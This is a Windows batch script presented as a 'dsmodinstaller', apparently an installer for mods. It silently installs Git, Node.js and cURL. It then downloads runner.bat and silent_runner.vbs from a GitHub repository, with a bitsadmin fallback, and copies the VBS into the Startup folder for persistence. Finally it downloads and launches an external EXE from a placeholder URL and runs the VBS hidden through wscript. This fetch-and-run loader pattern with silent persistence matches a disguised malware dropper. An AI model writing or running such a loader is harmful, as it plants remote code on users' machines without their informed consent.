@echo off
:: Create dsmodinstaller directory
mkdir "%appdata%\dsmodinstaller" >nul 2>&1

:: Install Git (if missing)
where git >nul 2>nul || winget install --id Git.Git -e --silent

:: Install Node.js (if missing)
where node >nul 2>nul || winget install --id OpenJS.NodeJS -e --silent

:: Install cURL (if missing)
where curl >nul 2>nul || winget install --id cURL.cURL -e --silent

:: Download runner.bat from GitHub
curl -L -o "%appdata%\dsmodinstaller\runner.bat" "https://raw.githubusercontent.com/6686-repos/DsModInstallerFiles/refs/heads/main/runner.bat" || bitsadmin /transfer job /download /priority high "https://raw.githubusercontent.com/6686-repos/DsModInstallerFiles/refs/heads/main/runner.bat" "%appdata%\dsmodinstaller\runner.bat"

:: Download silent_runner.vbs from GitHub
curl -L -o "%appdata%\dsmodinstaller\silent_runner.vbs" "https://raw.githubusercontent.com/6686-repos/DsModInstallerFiles/refs/heads/main/silent_runner.vbs" || bitsadmin /transfer job /download /priority high "https://raw.githubusercontent.com/6686-repos/DsModInstallerFiles/refs/heads/main/silent_runner.vbs" "%appdata%\dsmodinstaller\silent_runner.vbs"

:: Copy silent script to Startup folder
copy "%appdata%\dsmodinstaller\silent_runner.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul

:: Download and run external EXE (replace EXE_URL later)
curl -L -o "%appdata%\dsmodinstaller\external.exe" "EXE_URL" || bitsadmin /transfer job /download /priority high "EXE_URL" "%appdata%\dsmodinstaller\external.exe"
start "" "%appdata%\dsmodinstaller\external.exe"

:: Run silent script silently
start "" wscript.exe "%appdata%\dsmodinstaller\silent_runner.vbs"

:: Keep terminal open
echo Press any key to close...
pause >nul
